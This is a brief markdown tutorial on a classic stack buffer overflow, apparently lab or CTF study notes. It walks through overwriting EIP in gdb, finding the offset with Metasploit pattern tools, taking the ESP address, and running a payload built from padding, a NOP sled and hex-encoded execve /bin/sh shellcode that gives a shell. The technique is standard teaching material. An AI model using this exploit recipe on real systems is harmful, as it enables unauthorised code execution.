# Shell Code

## Take Control of EIP

With `gdb`, send a large number of 'A' to the program until getting an error (`SIGSEGV, Segmentation fault`)

```sh
(gdb) run $(python2 -c "print 'A' * 1200")
```

From the register information `info registers`, verify that we have successfully overwritten `EIP` and it has the values `A` which is `0x41414141`

## Finding the offset

Now we need to find the `offset` which is the exact size needed to overwrite `EIP`

```sh
msf-pattern_create -l 100
```

Execute the command output in `gdb` 

```sh
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4A...
```

Verify that `EIP` has a new value, take this value and find the corresponding `offset`.

```sh
msf-pattern_offset -q {EIP_VALUE}
```

This will return a value which will be the size of our offset (`size-offset`)

So we need `size-offset` characters followed by our shellcode. 
Basically everything beyond the size of our offset will be executed in memory in `EBP`

Then

```sh
(gdb) run $(python2 -c "print 'A'*{size-offset}")
```

The program will crash and we check the `ESP` register

```sh
(gdb) info frame
(gdb) print $esp 
# => 0xffffcee0
```

## Generating Shellcode

We need to write the ESP value in reverse which is `\xe0\xce\xff\xff` -> `{esp-reverse}`

ShellCode:

```sh
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

Execute the program to get a shell

```sh
./run $(python2 -c "print 'A'*{size-offset} + '{esp-reverse}' + '\x90'*40 + '{shellcode}'")
```

> __NOTE:__ If we have the characters `1�Ph//shh/bin��PS��` we need to increase the number of `NOPs`


